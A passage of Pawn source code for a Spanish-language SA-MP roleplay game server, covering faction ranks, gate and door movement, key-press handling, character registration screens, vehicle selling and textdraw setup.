						SendClientMessage(i, COLOR_LIGHTYELLOW2,"{878EE7}[Castigo OOC]:{C8C8C8} has finalizado tu castigo, puedes irte ahora.");
					    SetPlayerInterior(i, 0);
					    PlayerInfo[i][pA] = 176.6281;
						PlayerInfo[i][pX] = 1685.7615;
						PlayerInfo[i][pY] = -2241.1375;
						PlayerInfo[i][pZ] = 13.5469;
						SetPlayerPos(i, 1685.7615, -2241.1375, 13.5469);
						SetPlayerFacingAngle(i, 176.6281);
						SetPlayerHealthEx(i, 100.0);
						TogglePlayerControllable(i, true);
			        }
				}
			}
		}
	}
	return 1;
}

public AllowAd(playerid) {
	AllowAdv[playerid] = 1;
	return 1;
}

stock GetRankName(factionid, rank) {
	new
		ranktext[64];
	// Devuelve el nombre del rango.
	switch(rank) {
		case 1: format(ranktext, sizeof(ranktext), "%s", FactionInfo[factionid][fRank1]);
	    case 2: format(ranktext, sizeof(ranktext), "%s", FactionInfo[factionid][fRank2]);
	    case 3: format(ranktext, sizeof(ranktext), "%s", FactionInfo[factionid][fRank3]);
	    case 4: format(ranktext, sizeof(ranktext), "%s", FactionInfo[factionid][fRank4]);
	    case 5: format(ranktext, sizeof(ranktext), "%s", FactionInfo[factionid][fRank5]);
	    case 6: format(ranktext, sizeof(ranktext), "%s", FactionInfo[factionid][fRank6]);
	    case 7: format(ranktext, sizeof(ranktext), "%s", FactionInfo[factionid][fRank7]);
	    case 8: format(ranktext, sizeof(ranktext), "%s", FactionInfo[factionid][fRank8]);
	    case 9: format(ranktext, sizeof(ranktext), "%s", FactionInfo[factionid][fRank9]);
	    case 10: format(ranktext, sizeof(ranktext), "%s", FactionInfo[factionid][fRank10]);
	    default: format(ranktext, sizeof(ranktext), "error");
	}
	return ranktext;
}

SetPlayerFaction(targetid, factionid, rank)
{
	new oldfaction = PlayerInfo[targetid][pFaction];
	
	if(factionid == 0 && (oldfaction == FAC_PMA || oldfaction == FAC_SIDE))
	    EndPlayerDuty(targetid);

	PlayerInfo[targetid][pFaction] = factionid;
	PlayerInfo[targetid][pRank] = rank;
	if(factionid == 0)
	{
		// Deja la facci�n.
		if(FactionInfo[factionid][fAllowJob] == 0)
		{
			PlayerInfo[targetid][pJobAllowed] = 1;
		    PlayerInfo[targetid][pJob] = 0;
		}
		
		if(PlayerInfo[targetid][pJob] == JOB_DRUGD) //para que no quede con el job sin mafia
		    PlayerInfo[targetid][pJob] = 0;
		    
		if(FactionInfo[oldfaction][fType] == FAC_TYPE_GANG)
		    HideGangZonesToPlayer(targetid);
		
		SetPlayerSkin(targetid, PlayerInfo[targetid][pSkin]);
		
	} else {
	    // Ingresa.
		if(FactionInfo[factionid][fAllowJob] == 0)
		{
			PlayerInfo[targetid][pJobAllowed] = 0;
			PlayerInfo[targetid][pJob] = 0;
		}
			
		if(FactionInfo[factionid][fType] == FAC_TYPE_GANG)
			ShowGangZonesToPlayer(targetid);
	}
}

public PhoneAnimation(playerid) {
	if(!IsPlayerInAnyVehicle(playerid))	{
		SetPlayerSpecialAction(playerid,SPECIAL_ACTION_USECELLPHONE);
		SetTimerEx("HangupTimer", 5000, false, "i", playerid);
		return 1;
	}
	return 0;
}

stock IsValidSkin(skinid)
{
    #define	MAX_BAD_SKINS 22
    new badSkins[MAX_BAD_SKINS] =
    {
        3, 4, 5, 6, 8, 42, 65, 74, 86,
        119, 149, 208, 265, 266, 267,
        268, 269, 270, 271, 272, 273, 289
    };
    if (skinid < 0 || skinid > 299) return false;
    for (new i = 0; i < MAX_BAD_SKINS; i++)
    {
        if (skinid == badSkins[i]) return false;
    }
    #undef MAX_BAD_SKINS
    return 1;
}

public GetClosestPlayer(p1) {
	new Float:dis,Float:dis2,player;
	player = -1;
	dis = 99999.99;
	foreach(new i : Player) {
		if(i != p1) {
			dis2 = GetDistanceBetweenPlayers(i,p1);
			if(dis2 < dis && dis2 != -1.00) {
				dis = dis2;
				player = i;
			}
		}
	}
	return player;
}

stock GetClosestVehicle(playerid, Float:radius) {
    new
		playerVeh = GetPlayerVehicleID(playerid),
        closestVeh = INVALID_VEHICLE_ID,
        Float: distance[2],
        Float: pos[3];

    distance[1] = 99999.0;
    GetPlayerPos(playerid, pos[0], pos[1], pos[2]);

    for(new vehicleid = 1; vehicleid < MAX_VEH; vehicleid++) {
	   	if(vehicleid == playerVeh)
	   	    continue;
	   	    
        distance[0] = GetVehicleDistanceFromPoint(vehicleid, pos[0], pos[1], pos[2]);
            
		if(distance[0] < distance[1]) {
            distance[1] = distance[0];
            closestVeh = vehicleid;
        }
    }
    if(distance[1] > radius) {
        return INVALID_VEHICLE_ID;
	} else {
		return closestVeh;
	}
}

stock Float:GetDistanceBetweenPlayers(p1, p2) {
	new Float:x1,Float:y1,Float:z1,Float:x2,Float:y2,Float:z2;
	if(!IsPlayerConnected(p1) || !IsPlayerConnected(p2)) {
		return -1.00;
	}
	GetPlayerPos(p1,x1,y1,z1);
	GetPlayerPos(p2,x2,y2,z2);
	return floatsqroot(floatpower(floatabs(floatsub(x2,x1)),2)+floatpower(floatabs(floatsub(y2,y1)),2)+floatpower(floatabs(floatsub(z2,z1)),2));
}

public Float:GetDistance(Float:x1,Float:y1,Float:z1,Float:x2,Float:y2,Float:z2) {
	return floatsqroot(floatpower(floatabs(floatsub(x2,x1)),2)+floatpower(floatabs(floatsub(y2,y1)),2)+floatpower(floatabs(floatsub(z2,z1)),2));
}

public ResetPlayerWantedLevelEx(playerid) {
  	format(PlayerInfo[playerid][pAccusedOf], 64, "Sin cargos");
  	format(PlayerInfo[playerid][pAccusedBy], 24, "Nadie");
	PlayerInfo[playerid][pWantedLevel] = 0;
	return 1;
}

public SetPlayerWantedLevelEx(playerid, level) {
	PlayerInfo[playerid][pWantedLevel] = level;
	return 1;
}

public GetPlayerWantedLevelEx(playerid) {
	return PlayerInfo[playerid][pWantedLevel];
}

public CloseGate(gateID) {
	if(gateID == PMBarrier) {
		MoveObject(PMBarrier,  1544.68, -1631.00, 13.19, 0.004, 0.00, 90.00, 90.00);
	} else if(gateID == TMMAGate) {
	   	MoveObject(TMMAGate, 1579.33435, -1822.82764, 11.95710, 3.0, 0.00, 0.00, 90.00);
	} else if(gateID == TMMABarrier) {
	   	MoveObject(TMMABarrier, 1605.30334, -1813.58618, 13.54430, 0.004, 0.00000, 90.00000, 0.00000);
	} else if(gateID == MANGate) {
	   	MoveObject(MANGate, 781.57, -1329.41, 13.34, 0.004, 0.00, 270.00, 0.00);
	} else if(gateID == HOSPGate) {
	    MoveObject(HOSPGate, 1147.03149,-1384.87317, 13.46000, 0.0001, 0.00000, -90.00000, 0.00000);
	} else if(gateID == PMGate) {
	    MoveObject(PMGate, 1589.73499, -1638.32410, 14.27130, 2.0, 0.00000, 0.00000, 90.00000);
	} else if(gateID == BERTGate) {
	    MoveObject(BERTGate, 1245.07910, -767.55127, 90.60150, 2.0, 0.00000, 0.00000, 180.00000);
	} else if(gateID == FORZGate) {
	    MoveObject(FORZGate, 263.59546, -1333.77124, 51.39749, 2.0, 0.00000, 0.00000, 35.82000);
	}/* else if(gateID == CHINGate[0]) {
		MoveObject(CHINGate[0], 324.34799, -1185.18579, 75.42600, 2.0, 0.00000, 0.00000, 37.50000);
		MoveObject(CHINGate[1], 317.32422, -1190.57642, 75.42602, 2.0, 0.00000, 0.00000, 37.49999);
	}*/
	
	
	return 1;
}

TIMER:CloseSIDEGate() {
    if(SIDEGate[0] == 1) {
    	SIDEGate[0] = 0;
		MoveObject(SIDEGate[1], 1286.31, -1654.82, 14.28, 1, 0.00, 0.00, 0.00);
		MoveObject(SIDEGate[2], 1286.30, -1645.22, 17.77, 1, 0.00, 0.00, 0.00);
		MoveObject(SIDEGate[3], 1286.32, -1645.22, 14.28, 1, 0.00, 0.00, 0.00);
		MoveObject(SIDEGate[4], 1286.28, -1654.82, 17.75, 1, 0.00, 0.00, 0.00);
		MoveObject(SIDEGate[5], 1286.30, -1654.10, 17.87, 1, 180.00, 0.00, 90.00);
		MoveObject(SIDEGate[6], 1286.30, -1642.65, 17.87, 1, 180.00, 0.00, 90.00);
    }
    return 1;
}

public OnPlayerKeyStateChange(playerid, newkeys, oldkeys) {
	new
		string[128];

	// Si est� esposado, cae al piso al intentar saltar.
	if(newkeys & KEY_JUMP && !(oldkeys & KEY_JUMP) && GetPlayerSpecialAction(playerid) == SPECIAL_ACTION_CUFFED)
		ApplyAnimation(playerid, "GYMNASIUM", "gym_jog_falloff",4.1,0,1,1,0,0);
		
	if(newkeys == 16 && InEnforcer[playerid])
	{
		new Float:X, Float:Y, Float:Z;
		GetVehiclePos(InEnforcer[playerid], X, Y, Z);
		SetPlayerPos(playerid, X+4, Y, Z);
		SetPlayerInterior(playerid, 0);
		InEnforcer[playerid] = 0;
	}

	if(PRESSED(KEY_WALK)) {
		if(PlayerInfo[playerid][pSpectating] != INVALID_PLAYER_ID && PlayerInfo[playerid][pAdmin] >= 1) {
			PlayerInfo[playerid][pSpectating] = INVALID_PLAYER_ID;
		    TogglePlayerSpectating(playerid, false);
			SetCameraBehindPlayer(playerid);
		    SetPlayerPos(playerid, PlayerInfo[playerid][pX], PlayerInfo[playerid][pY], PlayerInfo[playerid][pZ]);
		    SetPlayerInterior(playerid, PlayerInfo[playerid][pInterior]);
		    SetPlayerVirtualWorld(playerid, PlayerInfo[playerid][pVirtualWorld]);
		    TextDrawHideForPlayer(playerid, textdrawVariables[0]);
			return 1;
		}
    }

	if((newkeys & KEY_ACTION) && !(oldkeys & KEY_ACTION))
	{
		new v = GetPlayerVehicleID(playerid);
		if(GetVehicleModel(v) == 481 || GetVehicleModel(v) == 509 || GetVehicleModel(v) == 510)
			TogglePlayerControllable(playerid, 0);
	}
	if((oldkeys & KEY_ACTION) && !(newkeys & KEY_ACTION))
	{
		new v = GetPlayerVehicleID(playerid);
		if(GetVehicleModel(v) == 481 || GetVehicleModel(v) == 509 || GetVehicleModel(v) == 510)
	  		TogglePlayerControllable(playerid, 1);
	}

	// Puertas-barreras.
	if((IsPlayerInAnyVehicle(playerid) && GetPlayerVehicleSeat(playerid) == 0 && newkeys & KEY_CROUCH) || newkeys & KEY_SECONDARY_ATTACK) {
        if(PlayerInfo[playerid][pFaction] == FAC_MAN) {
	    	if(PlayerToPoint(10.0, playerid, 778.88, -1329.78, 13.54)) {
	            MoveObject(MANGate, 781.57, -1329.41, 13.341, 0.004, 0.00, 360.00, 0.00);
	            SetTimerEx("CloseGate", 4000, false, "i", MANGate);
	        }
	    } else
		if(PlayerInfo[playerid][pFaction] == FAC_MECH) {
	    	if(PlayerToPoint(10.0, playerid, 1579.33435, -1822.82764, 11.95710)) {
	            MoveObject(TMMAGate, 1579.33435, -1810.82764, 11.95710, 3.0, 0.00, 0.00, 90.00);
	            SetTimerEx("CloseGate", 4000, false, "i", TMMAGate);
	            } else
	        if(PlayerToPoint(10.0, playerid, 1605.30334, -1813.58618, 13.54430)) {
	            MoveObject(TMMABarrier, 1605.30334, -1813.58618, 13.54430, 0.004, 0.00000, 0.00000, 0.00000);
	            SetTimerEx("CloseGate", 6000, false, "i", TMMABarrier);
	        }
	    } else
	    if(PlayerInfo[playerid][pFaction] == FAC_PMA) {
	        if(PlayerToPoint(10.0, playerid, 1544.69, -1630.79, 13.10)) {
	            MoveObject(PMBarrier,  1544.68, -1631.00, 13.191, 0.004,0.00, 0.00, 90.00);
	            SetTimerEx("CloseGate", 4000, false, "i", PMBarrier);
	        } else
	        if(PlayerToPoint(10.0, playerid, 1588.58, -1638.11, 13.48)) {
	            MoveObject(PMGate, 1589.73499, -1638.32410, 17.43779, 2.0, 0.00000, 0.00000, 90.00000);
	            SetTimerEx("CloseGate", 6000, false, "i", PMGate);
	        }
	    } else
	    if(PlayerInfo[playerid][pFaction] == FAC_HOSP) {
	        if(PlayerToPoint(10.0, playerid, 1143.42, -1384.82, 13.79)) {
	            MoveObject(HOSPGate,  1147.03149, -1384.87317, 13.46000, 0.0001, 0.00000, 0.00000, 0.00000);
	            SetTimerEx("CloseGate", 4000, false, "i", HOSPGate);
	        }
	    } else
	    if(PlayerInfo[playerid][pFaction] == FAC_FREE_ILLEGAL_MAF_4) {
	        if(PlayerToPoint(15.0, playerid, 1245.11, -767.45, 92.16)) {
	            MoveObject(BERTGate,  1241.1888, -771.8996, 90.6015, 2.0, 0.0000, 0.0000, 96.6600);
	            SetTimerEx("CloseGate", 6000, false, "i", BERTGate);
	        }
	    } else
		if(PlayerInfo[playerid][pFaction] == FAC_FREE_ILLEGAL_MAF_1) {
	        if(PlayerToPoint(10.0, playerid, 263.70, -1332.88, 53.43)) {
	            MoveObject(FORZGate,  257.1657, -1338.4166, 51.3975, 2, 0.0000, 0.0000, 35.8200);
	            SetTimerEx("CloseGate", 6000, false, "i", FORZGate);
	        }
	    }/* else
	    if(PlayerInfo[playerid][pFaction] == FAC_CHIN) {
	        if(PlayerToPoint(10.0, playerid, 321.01, -1188.81, 76.36)) {
	            MoveObject(CHINGate[0], 330.4567, -1180.4983, 75.4260, 2.0, 0.0000, 0.0000, 37.5000);
				MoveObject(CHINGate[1], 310.6317, -1195.7115, 75.4260, 2.0, 0.0000, 0.0000, 37.5000);
	            SetTimerEx("CloseGate", 6000, false, "i", CHINGate[0]);
	        }
	    }
	    */
	    
    }

	if (PlayerInfo[playerid][pTutorial] == 1) {
		if (PlayerInfo[playerid][pRegStep] == 1) {
			if(PRESSED(KEY_SPRINT)) {
			    PlayerPlaySound(playerid, 1058, 0.0, 0.0, 0.0);
				if(PlayerInfo[playerid][pSex] == 1)	{
				    SetPlayerSkin(playerid, SkinRegFemale[0][0]);
			    	PlayerTextDrawSetString(playerid, RegTDGender[playerid], "Genero: femenino");
			    	PlayerInfo[playerid][pSex] = 0;
				} else {
					SetPlayerSkin(playerid, SkinRegMale[0][0]);
					PlayerTextDrawSetString(playerid, RegTDGender[playerid], "Genero: masculino");
					PlayerInfo[playerid][pSex] = 1;
				}
			} else if(PRESSED(KEY_SECONDARY_ATTACK)) {
			    PlayerPlaySound(playerid, 1150, 0.0, 0.0, 0.0);

			    PlayerTextDrawDestroy(playerid, RegTDArrow[playerid]);
				RegTDArrow[playerid] = CreatePlayerTextDraw(playerid, 501.000000, 133.500000, "~>~");
				PlayerTextDrawAlignment(playerid, RegTDArrow[playerid], 2);
				PlayerTextDrawBackgroundColor(playerid, RegTDArrow[playerid], 255);
				PlayerTextDrawFont(playerid, RegTDArrow[playerid], 2);
				PlayerTextDrawLetterSize(playerid, RegTDArrow[playerid], 0.260000, 0.899999);
				PlayerTextDrawColor(playerid, RegTDArrow[playerid], -1);
				PlayerTextDrawSetOutline(playerid, RegTDArrow[playerid], 1);
				PlayerTextDrawSetProportional(playerid, RegTDArrow[playerid], 1);
				PlayerTextDrawShow(playerid, RegTDArrow[playerid]);

				PlayerInfo[playerid][pRegStep]++;
				if(PlayerInfo[playerid][pSex] == 1)	{
				    format(string, sizeof(string), "Apariencia: %d/%d", RegCounter[playerid], sizeof(SkinRegMale));
				} else {
					format(string, sizeof(string), "Apariencia: %d/%d", RegCounter[playerid], sizeof(SkinRegFemale));
				}
	            PlayerTextDrawSetString(playerid, RegTDSkin[playerid], string);
			}
		} else if(PlayerInfo[playerid][pRegStep] == 2) {
		    if(PRESSED(KEY_SPRINT))	{
				RegCounter[playerid]++;
			    PlayerPlaySound(playerid, 1058, 0.0, 0.0, 0.0);
			    if(PlayerInfo[playerid][pSex] == 1) {
			        if(RegCounter[playerid] > sizeof(SkinRegMale)) {
			            RegCounter[playerid] = 1;
			        }
					SetPlayerSkin(playerid, SkinRegMale[RegCounter[playerid] - 1][0]);
					PlayerInfo[playerid][pSkin] = SkinRegMale[RegCounter[playerid] - 1][0];
					format(string, sizeof(string), "Apariencia: %d/%d", RegCounter[playerid], sizeof(SkinRegMale));
				} else {
				    if(RegCounter[playerid] > sizeof(SkinRegFemale)) {
			            RegCounter[playerid] = 1;
			        }
				    SetPlayerSkin(playerid, SkinRegFemale[RegCounter[playerid] - 1][0]);
				    PlayerInfo[playerid][pSkin] = SkinRegFemale[RegCounter[playerid] - 1][0];
				    format(string, sizeof(string), "Apariencia: %d/%d", RegCounter[playerid], sizeof(SkinRegFemale));
				}
				PlayerTextDrawSetString(playerid, RegTDSkin[playerid], string);
			} else if(PRESSED(KEY_SECONDARY_ATTACK)) {
			    PlayerPlaySound(playerid, 1150, 0.0, 0.0, 0.0);

			    PlayerTextDrawDestroy(playerid, RegTDArrow[playerid]);
				RegTDArrow[playerid] = CreatePlayerTextDraw(playerid, 501.000000, 144.500000, "~>~");
				PlayerTextDrawAlignment(playerid, RegTDArrow[playerid], 2);
				PlayerTextDrawBackgroundColor(playerid, RegTDArrow[playerid], 255);
				PlayerTextDrawFont(playerid, RegTDArrow[playerid], 2);
				PlayerTextDrawLetterSize(playerid, RegTDArrow[playerid], 0.260000, 0.899999);
				PlayerTextDrawColor(playerid, RegTDArrow[playerid], -1);
				PlayerTextDrawSetOutline(playerid, RegTDArrow[playerid], 1);
				PlayerTextDrawSetProportional(playerid, RegTDArrow[playerid], 1);
				PlayerTextDrawShow(playerid, RegTDArrow[playerid]);

				PlayerInfo[playerid][pRegStep]++;
	   			RegCounter[playerid] = 18;

	   			PlayerTextDrawSetString(playerid, RegTDAge[playerid], "Edad: 18");
	   			ClearScreen(playerid);
	   			SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "Presiona ~k~~PED_SPRINT~ para incrementar el valor y ~k~~SNEAK_ABOUT~ para disminuirlo, ~k~~VEHICLE_ENTER_EXIT~ para finalizar.");
			}
		} else if(PlayerInfo[playerid][pRegStep] == 3) {
		    if(PRESSED(KEY_SPRINT))	{
				RegCounter[playerid]++;
			    PlayerPlaySound(playerid, 1058, 0.0, 0.0, 0.0);
	            if(RegCounter[playerid] > 99) {
		            RegCounter[playerid] = 18;
		        }
		        PlayerInfo[playerid][pAge] = RegCounter[playerid];
				format(string, sizeof(string), "Edad: %d", RegCounter[playerid]);
				PlayerTextDrawSetString(playerid, RegTDAge[playerid], string);
			}
			if(PRESSED(KEY_WALK)) {
			    RegCounter[playerid]--;
			    PlayerPlaySound(playerid, 1058, 0.0, 0.0, 0.0);
	            if(RegCounter[playerid] < 18) {
		            RegCounter[playerid] = 99;
		        }
		        PlayerInfo[playerid][pAge] = RegCounter[playerid];
				format(string, sizeof(string), "Edad: %d", RegCounter[playerid]);
				PlayerTextDrawSetString(playerid, RegTDAge[playerid], string);
			} else if(PRESSED(KEY_SECONDARY_ATTACK)) {
			    PlayerPlaySound(playerid, 1150, 0.0, 0.0, 0.0);

			    PlayerTextDrawDestroy(playerid, RegTDArrow[playerid]);
				RegTDArrow[playerid] = CreatePlayerTextDraw(playerid, 501.000000, 156.000000, "~>~");
				PlayerTextDrawAlignment(playerid, RegTDArrow[playerid], 2);
				PlayerTextDrawBackgroundColor(playerid, RegTDArrow[playerid], 255);
				PlayerTextDrawFont(playerid, RegTDArrow[playerid], 2);
				PlayerTextDrawLetterSize(playerid, RegTDArrow[playerid], 0.260000, 0.899999);
				PlayerTextDrawColor(playerid, RegTDArrow[playerid], -1);
				PlayerTextDrawSetOutline(playerid, RegTDArrow[playerid], 1);
				PlayerTextDrawSetProportional(playerid, RegTDArrow[playerid], 1);
				PlayerTextDrawShow(playerid, RegTDArrow[playerid]);

				PlayerInfo[playerid][pRegStep]++;
	   			RegCounter[playerid] = 1;
	            PlayerTextDrawSetString(playerid, RegTDOrigin[playerid], "Origen: latino");
	   			ClearScreen(playerid);
	   			SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "Presiona ~k~~PED_SPRINT~ para seleccionar una opci�n, ~k~~VEHICLE_ENTER_EXIT~ para finalizar.");
			}
		} else if(PlayerInfo[playerid][pRegStep] == 4) {
		    if(PRESSED(KEY_SPRINT)) {
				RegCounter[playerid]++;
			    PlayerPlaySound(playerid, 1058, 0.0, 0.0, 0.0);
			  	if(RegCounter[playerid] > 6) {
		            RegCounter[playerid] = 1;
		        }
				switch(RegCounter[playerid]) {
				    case 1:
				        PlayerTextDrawSetString(playerid, RegTDOrigin[playerid], "Origen: latino");
					case 2:
				        PlayerTextDrawSetString(playerid, RegTDOrigin[playerid], "Origen: europeo");
					case 3:
				        PlayerTextDrawSetString(playerid, RegTDOrigin[playerid], "Origen: americano");
					case 4:
				        PlayerTextDrawSetString(playerid, RegTDOrigin[playerid], "Origen: asiatico");
					case 5:
				        PlayerTextDrawSetString(playerid, RegTDOrigin[playerid], "Origen: africano");
					case 6:
				        PlayerTextDrawSetString(playerid, RegTDOrigin[playerid], "Origen: indefinido");
				}
			} else if(PRESSED(KEY_SECONDARY_ATTACK)) {
			    PlayerPlaySound(playerid, 1150, 0.0, 0.0, 0.0);

				TextDrawHideForPlayer(playerid, RegTDBorder1);
				TextDrawHideForPlayer(playerid, RegTDBorder2);
				TextDrawHideForPlayer(playerid, RegTDBackground);
				TextDrawHideForPlayer(playerid, RegTDTitle);
				PlayerTextDrawHide(playerid, RegTDGender[playerid]);
				PlayerTextDrawHide(playerid, RegTDSkin[playerid]);
				PlayerTextDrawHide(playerid, RegTDAge[playerid]);
				PlayerTextDrawHide(playerid, RegTDOrigin[playerid]);
				PlayerTextDrawHide(playerid, RegTDArrow[playerid]);
				PlayerInfo[playerid][pRegStep] = 0;
				PlayerInfo[playerid][pA] = 176.6281;
				PlayerInfo[playerid][pX] = 1685.7615;
				PlayerInfo[playerid][pY] = -2241.1375;
				PlayerInfo[playerid][pZ] = 13.5469;
				PlayerInfo[playerid][pInterior] = 0;
				PlayerInfo[playerid][pVirtualWorld] = 0;

				TogglePlayerControllable(playerid, true);

				SpawnPlayer(playerid);

				ClearScreen(playerid);
				SendClientMessage(playerid, COLOR_YELLOW2, "{878EE7}[INFO]:{C8C8C8} bienvenido, para ver los comandos escribe /ayuda.");
			}
		}
	}
	
	if(Choice[playerid] != CHOICE_NONE)
	{
		if(PRESSED(KEY_YES))
		{
            switch(Choice[playerid])
			{
                case CHOICE_CARSELL:
				{
                    Choice[playerid] = CHOICE_NONE;
                    
                   	new vehicleid = GetPlayerVehicleID(playerid),
					   	price = GetVehiclePrice(vehicleid, ServerInfo[sVehiclePricePercent]);
					   
					if(!IsPlayerInAnyVehicle(playerid))
					    return SendClientMessage(playerid, COLOR_YELLOW2, "No te encuentras en un veh�culo.");
					if(!IsAtDealership(playerid))
					    return SendClientMessage(playerid, COLOR_YELLOW2, "�No puedes vender un veh�culo en cualquier lugar!");
					if(!playerOwnsCar(playerid,vehicleid))
						return SendClientMessage(playerid, COLOR_YELLOW2, "�No puedes vender un veh�culo que no te pertenece!");

					GivePlayerCash(playerid, price / 2);
					resetVehicle(vehicleid);
                    VehicleInfo[vehicleid][VehType] = VEH_NONE;
					SetVehicleToRespawn(vehicleid);
					SaveVehicle(vehicleid);
					removeKeyFromPlayer(playerid,vehicleid);
					deleteExtraKeysForCar(vehicleid);
					SendFMessage(playerid, COLOR_WHITE, "Empleado: has vendido tu veh�culo por $%d, que tenga un buen d�a.", price / 2);
                    VehicleLog(vehicleid, playerid, INVALID_PLAYER_ID, "/vehvender", "");
				}
            }
            PlayerPlaySound(playerid, 5201, 0.0, 0.0, 0.0);
		} else if(PRESSED(KEY_NO)) {
            switch(Choice[playerid]) {
                case CHOICE_CARSELL: {

                }
            }
            PlayerPlaySound(playerid, 5205, 0.0, 0.0, 0.0);
            Choice[playerid] = CHOICE_NONE;
		}
	}
	if(PRESSED(KEY_YES)) 
	{
	    if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
	        cmd_motor(playerid, "");
	    return 1;
    }
	
	if(newkeys == KEY_SECONDARY_ATTACK && oldkeys != KEY_SECONDARY_ATTACK) {
		
		
		/* Entrada y salida de edificios. */
		if(PlayerInfo[playerid][pFaction] == FAC_SIDE) {
		    if(PlayerToPoint(3.5, playerid, 266.6, 112.5830078125, 1003.6171875)) {
				if(SIDEDoor[0][0] <= 0) {
				    SIDEDoor[0][0] = 1;
		    		MoveObject(SIDEDoor[0][1], 266.6, 112.5830078125, 1003.6171875, 3.5000, 0, 0, 0);
					MoveObject(SIDEDoor[1][1], 263.5, 112.55754852295, 1003.6171875, 3.5000, 0, 0, 0);
				} else {
					SIDEDoor[0][0] = 0;
					MoveObject(SIDEDoor[0][1], 265.7763671875, 112.5830078125, 1003.6171875, 3.5000, 0, 0, 0);
					MoveObject(SIDEDoor[1][1], 264.30032348633, 112.55754852295, 1003.6171875, 3.5000, 0, 0, 0);
				}
		    } else if(PlayerToPoint(3.5, playerid, 253.20094299316, 110.82429504395, 1004.8625488281)) {
				if(SIDEDoor[2][0] <= 0) {
				    SIDEDoor[2][0] = 1;
		    		MoveObject(SIDEDoor[2][1], 253.20094299316, 111.82429504395, 1004.8625488281, 3.5000, 0, 0, 0);
					MoveObject(SIDEDoor[3][1], 253.23199462891, 108.0904083252, 1004.8625488281, 3.5000, 0, 0, 0);
				} else {
					SIDEDoor[2][0] = 0;
					MoveObject(SIDEDoor[2][1], 253.20094299316, 110.82429504395, 1004.8625488281, 3.5000, 0, 0, 0);
					MoveObject(SIDEDoor[3][1], 253.23199462891, 109.0904083252, 1004.8625488281, 3.5000, 0, 0, 0);
				}
		    } else if(PlayerToPoint(3.5, playerid, 239.59048461914, 117.59116363525, 1004.8555908203)) {
				if(SIDEDoor[4][0] <= 0) {
                    SIDEDoor[4][0] = 1;
		    		MoveObject(SIDEDoor[4][1], 239.73849487305,116.5859375,1004.8555908203, 3.5000, 0, 0, 0);
					MoveObject(SIDEDoor[5][1], 239.828125,120.27496337891,1005.0729980469, 3.5000, 0, 0, 0);
				} else {
					SIDEDoor[4][0] = 0;
					MoveObject(SIDEDoor[4][1], 239.59048461914, 117.59116363525, 1004.8555908203, 3.5000, 0, 0, 0);
					MoveObject(SIDEDoor[5][1], 239.5966796875, 119.25390625, 1004.8555908203, 3.5000, 0, 0, 0);
				}
		    }
	    }
		
	    if(GetPVarInt(playerid, "disabled") == DISABLE_NONE) {

			/*  Entrada a casas. */
			if(EnterHouse(playerid))
			    return 1;

			/*  Entrada a edificios. */
			if(EnterBuilding(playerid))
			    return 1;
			    
			/* Entrada a negocios. */
			if(EnterBusiness(playerid))
			    return 1;

            /*  Salida de casas. */
			if(LeaveHouse(playerid))
			    return 1;

			/* Salida de edificios. */
			if(LeaveBuilding(playerid))
			    return 1;

			/* Salida de negocios. */
			if(LeaveBusiness(playerid))
			    return 1;
			    
		} else {
		    SendClientMessage(playerid, COLOR_YELLOW2, "No puedes hacerlo en este momento.");
		}
	}
	return 1;
}

public Unfreeze(playerid) {
	TogglePlayerControllable(playerid, 1);
    return 1;
}

stock LoadTDs() {

	textdrawVariables[0] = TextDrawCreate(149.000000, 420.000000, "Presiona ~r~~k~~SNEAK_ABOUT~~w~ para cerrar el modo espectador.");
	TextDrawBackgroundColor(textdrawVariables[0], 255);
	TextDrawFont(textdrawVariables[0], 2);
	TextDrawLetterSize(textdrawVariables[0], 0.390000, 1.200000);
	TextDrawColor(textdrawVariables[0], -1);
	TextDrawSetOutline(textdrawVariables[0], 0);
	TextDrawSetProportional(textdrawVariables[0], 1);
	TextDrawSetShadow(textdrawVariables[0], 1);
	
	textdrawVariables[1] = TextDrawCreate(499.000000, 7.000000, "malosaires.com.ar");
	TextDrawBackgroundColor(textdrawVariables[1], 255);
	TextDrawFont(textdrawVariables[1], 1);
	TextDrawLetterSize(textdrawVariables[1], 0.300000, 1.200000);
	TextDrawColor(textdrawVariables[1], 929337855);
	TextDrawSetOutline(textdrawVariables[1], 1);
	TextDrawSetProportional(textdrawVariables[1], 1);
    
	RegTDBorder1 = TextDrawCreate(635.000000, 106.000000, " ");
	TextDrawBackgroundColor(RegTDBorder1, 255);
	TextDrawFont(RegTDBorder1, 1);
	TextDrawLetterSize(RegTDBorder1, 0.500000, 1.000000);
	TextDrawColor(RegTDBorder1, -1);
	TextDrawSetOutline(RegTDBorder1, 0);
	TextDrawSetProportional(RegTDBorder1, 1);
	TextDrawSetShadow(RegTDBorder1, 1);
	TextDrawUseBox(RegTDBorder1, 1);
	TextDrawBoxColor(RegTDBorder1, 255);
	TextDrawTextSize(RegTDBorder1, 495.000000, 121.000000);

	RegTDBorder2 = TextDrawCreate(635.000000, 172.000000, " ");
	TextDrawBackgroundColor(RegTDBorder2, 255);
	TextDrawFont(RegTDBorder2, 1);
	TextDrawLetterSize(RegTDBorder2, 0.500000, 1.000000);
	TextDrawColor(RegTDBorder2, -1);
	TextDrawSetOutline(RegTDBorder2, 0);
	TextDrawSetProportional(RegTDBorder2, 1);
	TextDrawSetShadow(RegTDBorder2, 1);
	TextDrawUseBox(RegTDBorder2, 1);
	TextDrawBoxColor(RegTDBorder2, 255);
	TextDrawTextSize(RegTDBorder2, 495.000000, 121.000000);

	RegTDBackground = TextDrawCreate(565.000000, 109.000000, "~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~");
	TextDrawAlignment(RegTDBackground, 2);
	TextDrawBackgroundColor(RegTDBackground, 255);
	TextDrawFont(RegTDBackground, 1);
	TextDrawLetterSize(RegTDBackground, 0.480000, 0.554000);
	TextDrawColor(RegTDBackground, -1);
	TextDrawSetOutline(RegTDBackground, 0);
	TextDrawSetProportional(RegTDBackground, 1);
	TextDrawSetShadow(RegTDBackground, 1);
	TextDrawUseBox(RegTDBackground, 1);
	TextDrawBoxColor(RegTDBackground, -1936946099);
	TextDrawTextSize(RegTDBackground, 32.000000, 132.000000);

    RegTDTitle = TextDrawCreate(502.000000, 110.000000, "Datos de tu personaje:");
	TextDrawBackgroundColor(RegTDTitle, 255);
	TextDrawFont(RegTDTitle, 2);
	TextDrawLetterSize(RegTDTitle, 0.234000, 1.200000);
	TextDrawColor(RegTDTitle, 1684301055);
